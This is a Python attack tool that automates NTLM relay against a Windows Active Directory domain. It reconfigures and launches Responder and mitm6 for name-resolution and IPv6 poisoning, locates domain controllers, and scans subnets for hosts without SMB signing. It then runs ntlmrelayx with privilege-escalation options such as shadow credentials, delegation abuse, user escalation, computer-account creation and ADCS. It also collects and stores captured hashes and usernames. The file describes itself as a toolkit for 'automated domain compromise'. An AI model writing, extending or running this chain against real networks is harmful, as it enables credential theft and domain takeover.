#!/usr/bin/env python3

import argparse
import sys
import os
import re
import asyncio
import dns.resolver
import ipaddress
import netifaces
import signal
import tempfile
import subprocess
from termcolor import colored
from subprocess import Popen, PIPE, run
from datetime import datetime
from netaddr import IPNetwork, AddrFormatError
from pathlib import Path
import shutil
import json
import logging

def print_bad(msg):
    print(colored('[-] ', 'red') + msg)

def print_info(msg):
    print(colored('[*] ', 'blue') + msg)
    
def print_good(msg):
    print(colored('[+] ', 'green') + msg)

class AutoRelay:
    def __init__(self, domain, interface=None, verbose=False):
        self.domain = domain
        self.interface = interface or self.get_default_interface()
        self.local_ip = self.get_local_ip()
        self.dcs = set()
        self.relay_targets = set()
        self.timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.verbose = verbose
        
        # Setup directory structure
        self.base_dir = Path('relay_toolkit_data')
        self.logs_dir = self.base_dir / 'logs'
        self.hashes_dir = self.base_dir / 'hashes'
        self.work_dir = self.base_dir / f'session_{self.timestamp}'
        
        # Create directories
        for d in [self.logs_dir, self.hashes_dir, self.work_dir]:
            d.mkdir(parents=True, exist_ok=True)
            
        # Log files
        self.smb_targets_file = self.work_dir / 'smb_signing_disabled.txt'
        self.found_users_file = self.work_dir / 'found_users.txt'
        self.found_hashes_file = self.work_dir / 'found_hashes.txt'
        self.found_passwords_file = self.work_dir / 'found_passwords.txt'
        self.shares_file = self.work_dir / 'shares_with_scf.txt'
        self.verbose_log = self.work_dir / 'verbose.log'
        self.relay_log = self.work_dir / 'relay_attempts.log'
        
        # Configure logging
        self.setup_logging()

    def setup_logging(self):
        logging.basicConfig(
            level=logging.DEBUG if self.verbose else logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(self.verbose_log),
                logging.StreamHandler()
            ]
        )

    def log_verbose(self, msg):
        logging.debug(msg)
        if self.verbose:
            print_info(msg)

    def get_default_interface(self):
        try:
            return netifaces.gateways()['default'][netifaces.AF_INET][1]
        except:
            for iface in netifaces.interfaces():
                if not iface.startswith('lo'):
                    addrs = netifaces.ifaddresses(iface)
                    if netifaces.AF_INET in addrs:
                        return iface
            return None

    def get_local_ip(self):
        return netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]['addr']

    def setup_responder_config(self):
        """Configure Responder for optimal relay operation"""
        responder_conf = Path('/usr/share/responder/Responder.conf')
        if responder_conf.exists():
            config = responder_conf.read_text()
            
            # Optimize config for relaying
            replacements = {
                'SMB = On': 'SMB = Off',
                'HTTP = On': 'HTTP = Off',
                'HTTPS = On': 'HTTPS = On',
                'DNS = On': 'DNS = On',
                'LDAP = On': 'LDAP = Off',
                'SQL = On': 'SQL = On',
                'FTP = On': 'FTP = On',
                'POP = On': 'POP = On',
                'SMTP = On': 'SMTP = On',
                'IMAP = On': 'IMAP = On',
                'MSSQL = On': 'MSSQL = Off'
            }
            
            for old, new in replacements.items():
                config = config.replace(old, new)
            
            # Backup original config
            backup_file = self.work_dir / 'Responder.conf.bak'
            shutil.copy(responder_conf, backup_file)
            
            # Write new config
            responder_conf.write_text(config)
            self.log_verbose("Configured Responder.conf")

    async def monitor_hash_files(self):
        """Monitor Responder output for hashes"""
        responder_dir = Path('/usr/share/responder/logs')
        start_time = datetime.now()
        
        hash_types = [
            'HTTP-NTLMv1-Client', 'HTTP-NTLMv2-Client', 
            'LDAP-NTLMv1-Client', 'MSSQL-NTLMv1-Client',
            'MSSQL-NTLMv2-Client', 'SMB-NTLMv1-Client',
            'SMB-NTLMv2-Client', 'SMB-NTLMSSPv1-Client',
            'SMB-NTLMSSPv2-Client'
        ]
        
        while True:
            for hash_type in hash_types:
                for f in responder_dir.glob(f'{hash_type}-*.txt'):
                    if f.stat().st_mtime > start_time.timestamp():
                        hashes = f.read_text()
                        await self.process_hash(hashes)
                        # Archive processed hash file
                        f.rename(self.hashes_dir / f'{f.stem}_{self.timestamp}{f.suffix}')
            await asyncio.sleep(1)

    async def process_hash(self, hash_data):
        """Process and store captured hashes"""
        for line in hash_data.splitlines():
            if '::' in line:
                try:
                    user = line.split(':')[0]
                    domain = line.split(':')[2]
                    hash_value = ':'.join(line.split(':')[3:])
                    
                    # Store full hash
                    with open(self.found_hashes_file, 'a') as f:
                        f.write(f'{line}\n')
                    
                    # Store username
                    with open(self.found_users_file, 'a') as f:
                        f.write(f'{domain}\\{user}\n')
                    
                    print_good(f"Captured hash for {domain}\\{user}")
                    self.log_verbose(f"Hash details: {line}")
                except Exception as e:
                    self.log_verbose(f"Error processing hash line: {line} - {str(e)}")

    async def start_ntlmrelayx(self):
        """Start ntlmrelayx with comprehensive options"""
        targets_arg = f"-tf {self.smb_targets_file}" if self.relay_targets else "--no-smb-server"
        
        cmd = [
            "ntlmrelayx.py",
            targets_arg,
            "--smb2support",
            "--shadow-credentials",
            "--delegate-access",
            "--escalate-user",
            "--add-computer",
            "--remove-mic",
            "--sccm-dp",
            "--adcs",
            "--http-port", "80,443,8080",
            "--wcf-port", "9389",
            "--socks",
            "--random",
            "--keep-relaying",
            "--lootdir", f"{self.work_dir}/loot",
            "--output-file", f"{self.work_dir}/ntlmrelayx.log"
        ]
        
        self.log_verbose(f"Starting ntlmrelayx: {' '.join(cmd)}")
        return await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            start_new_session=True
        )

    async def start_responder(self):
        """Start Responder with optimal settings"""
        cmd = [
            "responder",
            "-I", self.interface,
            "-rdP",
            "-v"
        ]
        
        self.log_verbose(f"Starting Responder: {' '.join(cmd)}")
        return await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            start_new_session=True
        )

    async def start_mitm6(self):
        """Start mitm6 for IPv6 attacks"""
        cmd = [
            "mitm6",
            "-d", self.domain,
            "-i", self.interface
        ]
        
        self.log_verbose(f"Starting mitm6: {' '.join(cmd)}")
        return await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            start_new_session=True
        )

    async def monitor_process_output(self, process, name):
        """Monitor and log process output"""
        while True:
            try:
                line = await process.stdout.readline()
                if not line:
                    break
                line = line.decode().strip()
                if line:
                    self.log_verbose(f"[{name}] {line}")
            except Exception as e:
                self.log_verbose(f"Error reading {name} output: {e}")
                break

    async def discover_dcs(self):
        """Find domain controllers using DNS queries"""
        self.log_verbose(f"Starting DC discovery for domain: {self.domain}")
        
        resolver = dns.resolver.Resolver()
        resolver.lifetime = 3
        
        queries = [
            f'_ldap._tcp.dc._msdcs.{self.domain}',
            f'_kerberos._tcp.dc._msdcs.{self.domain}',
            f'_gc._tcp.{self.domain}',
        ]
        
        for query in queries:
            try:
                answers = resolver.resolve(query, 'SRV')
                for answer in answers:
                    dc_hostname = str(answer.target).rstrip('.')
                    try:
                        dc_ips = resolver.resolve(dc_hostname, 'A')
                        for ip in dc_ips:
                            self.dcs.add(str(ip))
                            print_good(f'Found DC: {dc_hostname} ({ip})')
                    except Exception as e:
                        print_bad(f"Error resolving DC IP: {e}")
            except Exception as e:
                self.log_verbose(f"DNS query error: {e}")

    async def scan_host(self, ip):
        """Scan single host for relay potential"""
        cmd = ["netexec", "smb", ip, "--gen-relay-list", "/dev/stdout"]
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.DEVNULL
        )
        stdout, _ = await proc.communicate()
        if ip in stdout.decode():
            print_good(f"Found target with SMB signing disabled: {ip}")
            return ip
        return None

    async def scan_subnets(self):
        """Scan subnets for relay targets"""
        subnets = set()
        for dc in self.dcs:
            try:
                ip = ipaddress.ip_address(dc)
                network = ipaddress.ip_network(f'{ip.exploded}/24', strict=False)
                subnets.add(str(network))
            except Exception as e:
                self.log_verbose(f"Error processing subnet: {e}")
                continue
        
        self.log_verbose(f"Scanning {len(subnets)} subnets for relay targets")
        
        for subnet in subnets:
            self.log_verbose(f"Scanning subnet {subnet}")
            tasks = []
            for ip in IPNetwork(subnet):
                ip_str = str(ip)
                if ip_str.split('.')[-1] not in ('0', '255'):
                    tasks.append(self.scan_host(ip_str))
            
            results = await asyncio.gather(*tasks)
            for result in results:
                if result:
                    self.relay_targets.add(result)
                    # Write targets to file as we find them
                    with open(self.smb_targets_file, 'a') as f:
                        f.write(f"{result}\n")

    async def auto_relay(self):
        """Run the full auto relay chain"""
        try:
            print_info("Starting automatic relay attack chain")
            self.log_verbose("Initializing attack chain")
            
            # Setup logging and monitoring
            self.setup_responder_config()
            monitor_task = asyncio.create_task(self.monitor_hash_files())
            
            # Start core services in parallel
            responder_proc = await self.start_responder()
            mitm6_proc = await self.start_mitm6()
            
            # Start output monitoring
            responder_monitor = asyncio.create_task(self.monitor_process_output(responder_proc, "Responder"))
            mitm6_monitor = asyncio.create_task(self.monitor_process_output(mitm6_proc, "mitm6"))
            
            # Discover targets
            await self.discover_dcs()
            self.log_verbose(f"Discovered DCs: {self.dcs}")
            
            # Scan for targets
            await self.scan_subnets()
            self.log_verbose(f"Found relay targets: {self.relay_targets}")
            
            # Start ntlmrelayx
            ntlmrelay_proc = await self.start_ntlmrelayx()
            ntlmrelay_monitor = asyncio.create_task(self.monitor_process_output(ntlmrelay_proc, "ntlmrelayx"))
            
            print_info("Attack chain running - capturing hashes and attempting relays")
            print_info("Press Ctrl+C to stop...")
            
            while True:
                await asyncio.sleep(1)
                
                # Check process status
                for name, proc in [
                    ("ntlmrelayx", ntlmrelay_proc),
                    ("Responder", responder_proc),
                    ("mitm6", mitm6_proc)
                ]:
                    if proc.returncode is not None:
                        print_bad(f"{name} died - restarting")
                        if name == "ntlmrelayx":
                            ntlmrelay_proc = await self.start_ntlmrelayx()
                            ntlmrelay_monitor.cancel()
                            ntlmrelay_monitor = asyncio.create_task(self.monitor_process_output(ntlmrelay_proc, name))
                        elif name == "Responder":
                            responder_proc = await self.start_responder()
                            responder_monitor.cancel()
                            responder_monitor = asyncio.create_task(self.monitor_process_output(responder_proc, name))
                    
                        else:  # mitm6
                            mitm6_proc = await self.start_mitm6()
                            mitm6_monitor.cancel()
                            mitm6_monitor = asyncio.create_task(self.monitor_process_output(mitm6_proc, name))

        except KeyboardInterrupt:
            print_info("\nReceived interrupt, cleaning up...")
        except Exception as e:
            print_bad(f"Error during attack chain: {e}")
            self.log_verbose(f"Fatal error: {str(e)}")
        finally:
            # Cancel monitoring tasks
            for task in [responder_monitor, mitm6_monitor, ntlmrelay_monitor]:
                if task:
                    task.cancel()
            
            self.cleanup()
            self.create_summary()

    def cleanup(self):
        """Cleanup processes and create final report"""
        print_info("Cleaning up...")
        
        # Kill processes
        procs = ['responder', 'mitm6', 'ntlmrelayx.py']
        for proc in procs:
            try:
                subprocess.run(['pkill', '-f', proc], stderr=subprocess.DEVNULL)
            except Exception as e:
                self.log_verbose(f"Error killing {proc}: {e}")
        
        # Archive logs
        if Path('/usr/share/responder/logs').exists():
            for f in Path('/usr/share/responder/logs').glob('*.txt'):
                try:
                    shutil.move(f, self.logs_dir / f'{f.stem}_{self.timestamp}{f.suffix}')
                except Exception as e:
                    self.log_verbose(f"Error archiving log {f}: {e}")
        
        # Create session archive
        try:
            shutil.make_archive(
                f'relay_toolkit_session_{self.timestamp}',
                'zip',
                self.work_dir
            )
        except Exception as e:
            self.log_verbose(f"Error creating archive: {e}")

    def create_summary(self):
        """Create attack session summary"""
        summary = self.work_dir / 'session_summary.txt'
        try:
            with open(summary, 'w') as f:
                f.write(f"Relay Toolkit Session Summary - {self.timestamp}\n")
                f.write("-" * 50 + "\n\n")
                
                f.write("Domain Controllers Found:\n")
                for dc in self.dcs:
                    f.write(f"- {dc}\n")
                
                f.write("\nRelay Targets Found:\n")
                for target in self.relay_targets:
                    f.write(f"- {target}\n")
                
                if self.found_hashes_file.exists():
                    f.write("\nHashes Captured:\n")
                    f.write(self.found_hashes_file.read_text())
                
                if self.found_passwords_file.exists():
                    f.write("\nPasswords Found:\n")
                    f.write(self.found_passwords_file.read_text())
                
                if self.relay_log.exists():
                    f.write("\nRelay Attempts:\n")
                    f.write(self.relay_log.read_text())
        except Exception as e:
            self.log_verbose(f"Error creating summary: {e}")


def parse_args():
    parser = argparse.ArgumentParser(description='Enhanced relay toolkit for automated domain compromise')
    parser.add_argument("-d", "--domain", required=True, help="Domain to attack (e.g. domain.local)")
    parser.add_argument("-i", "--interface", help="Network interface to use")
    parser.add_argument("--auto", action="store_true", help="Enable automatic attack chain")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--no-mitm6", action="store_true", help="Disable mitm6 attacks")
    parser.add_argument("--no-responder", action="store_true", help="Disable Responder")
    parser.add_argument("--no-scan", action="store_true", help="Skip subnet scanning")
    parser.add_argument("--targets", help="File containing targets (one per line)")
    return parser.parse_args()

async def main():
    args = parse_args()
    
    if os.geteuid():
        print_bad('Script must be run as root')
        sys.exit(1)

    if args.auto:
        relay = AutoRelay(args.domain, args.interface, args.verbose)

        # Load targets if specified
        if args.targets and Path(args.targets).exists():
            with open(args.targets) as f:
                relay.relay_targets.update(f.read().splitlines())
            print_good(f"Loaded {len(relay.relay_targets)} targets from file")

        await relay.auto_relay()
    else:
        print_bad("Please use --auto for automatic attack chain")

if __name__ == "__main__":
    # Set up asyncio policy for Windows compatibility
    if sys.platform.startswith('win'):
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

    try:
        # Create new event loop
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # Run main with proper signal handlers
        loop.add_signal_handler(signal.SIGINT, lambda: print_info("\nReceived interrupt signal, cleaning up..."))
        loop.run_until_complete(main())
    except KeyboardInterrupt:
        print_info("\nExiting...")
    except Exception as e:
        print_bad(f"Fatal error: {e}")
        if '--verbose' in sys.argv:
            import traceback
            traceback.print_exc()
    finally:
        loop.close()
